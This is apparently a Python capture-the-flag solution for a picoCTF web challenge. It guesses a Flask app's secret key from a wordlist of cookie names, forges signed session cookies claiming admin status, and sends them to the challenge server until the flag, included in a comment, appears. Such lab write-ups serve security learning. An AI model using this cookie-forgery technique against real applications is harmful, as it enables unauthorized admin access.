#!/usr/bin/env python3
import zlib
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import base64_decode, URLSafeTimedSerializer
import requests


cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]


class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
    # NOTE: Override method
    def get_signing_serializer(self, secret_key):
        signer_kwargs = {
            'key_derivation': self.key_derivation,
            'digest_method': self.digest_method
        }
        return URLSafeTimedSerializer(
            secret_key,
            salt=self.salt,
            serializer=self.serializer,
            signer_kwargs=signer_kwargs
        )


class FlaskSessionCookieManager:
    @classmethod
    def decode(cls, secret_key, cookie):
        sscsi = SimpleSecureCookieSessionInterface()
        signingSerializer = sscsi.get_signing_serializer(secret_key)
        return signingSerializer.loads(cookie)

    @classmethod
    def encode(cls, secret_key, session):
        sscsi = SimpleSecureCookieSessionInterface()
        signingSerializer = sscsi.get_signing_serializer(secret_key)
        return signingSerializer.dumps(session)

def main():
    for c in cookie_names:
        print(c)
        session = { "very_auth": 'admin' }
        enc = FlaskSessionCookieManager.encode(c, session)
        print(enc)
        res = requests.get('http://mercury.picoctf.net:35697/display',
                           cookies={ 'session': enc },
                           headers= {
                               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                               "Accept-Encoding": "gzip, deflate",
                               "Accept-Language": "ja,en-US;q=0.9,en;q=0.8",
                               "Cache-Control": "max-age=0",
                               "Connection": "keep-alive",
                               # "Cookie": "session=eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YtUkpw.vZjrMBHUjAvAqOY3iXUTUviRYyY",
                               "Host": "mercury.picoctf.net:35697",
                               "Upgrade-Insecure-Requests": "1",
                               "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
                               },
                           allow_redirects=False,
                           )
        if 'pico' in res.text:
            print(res.text)
            return


if __name__ == '__main__':
    main()
    # picoCTF{pwn_4ll_th3_cook1E5_22fe0842}
